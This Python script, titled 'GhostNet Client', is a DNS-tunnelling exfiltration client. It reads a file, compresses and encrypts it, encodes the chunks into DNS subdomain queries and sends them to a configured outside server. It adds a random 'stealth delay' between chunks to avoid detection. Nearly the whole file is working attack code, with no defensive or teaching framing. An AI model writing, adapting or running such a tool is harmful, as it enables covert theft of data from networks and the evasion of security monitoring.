import socket
import struct
import json
import os
import sys
import time
import random
import argparse
import zlib
import uuid
import logging

# Add parent directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from common import encryption_utils, dns_utils

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_config():
    config_path = os.path.join(os.path.dirname(__file__), '..', 'config.json')
    with open(config_path, 'r') as f:
        return json.load(f)

CONFIG = load_config()
DOMAIN = CONFIG['domain']
SERVER_IP = CONFIG['server_ip']
PORT = CONFIG['server_port']
KEY = CONFIG['encryption_key'].encode()
CHUNK_SIZE = CONFIG['chunk_size']
DELAY_MIN = CONFIG['delay_min']
DELAY_MAX = CONFIG['delay_max']

def build_dns_query(qname):
    """
    Constructs a raw DNS query packet (A record).
    """
    # Transaction ID (random)
    tid = os.urandom(2)
    
    # Flags: Standard Query (0x0100)
    flags = b'\x01\x00'
    
    # Counts: QD=1, AN=0, NS=0, AR=0
    counts = struct.pack(">HHHH", 1, 0, 0, 0)
    
    header = tid + flags + counts
    
    # Question Section
    parts = qname.split('.')
    qname_encoded = b''
    for part in parts:
        qname_encoded += bytes([len(part)]) + part.encode()
    qname_encoded += b'\x00'
    
    # QTYPE (A=1) and QCLASS (IN=1)
    qtype_class = struct.pack(">HH", 1, 1)
    
    return header + qname_encoded + qtype_class

def send_chunk(sock, addr, chunk_payload, session_id, seq_num):
    """
    Sends a single chunk and waits for ACK.
    """
    encoded_payload = dns_utils.encode_chunk(chunk_payload)
    fqdn = dns_utils.build_subdomain(encoded_payload, session_id, DOMAIN)
    
    packet = build_dns_query(fqdn)
    
    retries = 3
    while retries > 0:
        try:
            sock.sendto(packet, addr)
            
            # Wait for response
            sock.settimeout(2.0)
            data, _ = sock.recvfrom(512)
            
            # If we got data, assume it's an ACK (we don't strictly parse it for now)
            # In a real scenario, check Transaction ID
            return True
            
        except socket.timeout:
            logging.warning(f"Timeout sending chunk {seq_num}. Retrying...")
            retries -= 1
        except Exception as e:
            logging.error(f"Error sending chunk {seq_num}: {e}")
            return False
            
    logging.error(f"Failed to send chunk {seq_num} after retries.")
    return False

def send_file(filepath):
    if not os.path.exists(filepath):
        logging.error(f"File not found: {filepath}")
        return

    logging.info(f"Preparing to send {filepath}...")
    
    # Read file
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Compress
    compressed_data = zlib.compress(data)
    logging.info(f"Compressed {len(data)} bytes to {len(compressed_data)} bytes.")
    
    # Encrypt
    encrypted_data = encryption_utils.encrypt_data(compressed_data, KEY)
    
    # Chunk
    # We need to account for the overhead of encoding and domain length limits.
    # Base32 expands 5 bytes to 8 chars.
    # Max label is 63. 63 chars -> ~39 bytes.
    # We set chunk_size in config. Let's use that.
    chunks = dns_utils.prepare_chunks(encrypted_data, CHUNK_SIZE)
    
    session_id = str(uuid.uuid4())[:8]
    logging.info(f"Session ID: {session_id}. Total chunks: {len(chunks)}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    for seq, chunk_data, is_last in chunks:
        payload = dns_utils.build_payload(seq, chunk_data, is_last)
        
        if send_chunk(sock, (SERVER_IP, PORT), payload, session_id, seq):
            logging.info(f"Sent chunk {seq}/{len(chunks)-1}")
        else:
            logging.error("Aborting transfer due to connection failure.")
            return
        
        # Stealth delay
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
        
    logging.info("File transfer completed.")

def main():
    parser = argparse.ArgumentParser(description="GhostNet Client")
    parser.add_argument("file", help="File to send")
    args = parser.parse_args()
    
    send_file(args.file)

if __name__ == "__main__":
    main()
